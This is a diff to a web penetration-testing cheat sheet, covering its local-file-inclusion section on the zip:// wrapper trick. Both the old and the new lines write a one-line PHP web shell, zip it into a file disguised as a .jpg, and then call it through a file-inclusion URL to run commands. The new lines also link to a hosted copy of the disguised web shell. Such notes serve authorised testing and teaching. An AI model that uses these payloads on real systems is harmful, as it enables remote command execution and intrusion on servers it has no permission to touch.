@@ -692,11 +692,10 @@ https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/code
 -> Zip
 
 1- 
-`echo '\<?php system($_GET["cmd"]); ?>' > ok.php && zip ok.jpg ok.php`  
-
+`echo '\<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php`  
 2- 
-`http://ip/index.php?file=zip://./uploads/ok.jpg%23ok.php&cmd=id`  
-/codes/lfi/ok.jpg
+`http://ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id`  
+https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg  
 
 #### Log Poisoning
  
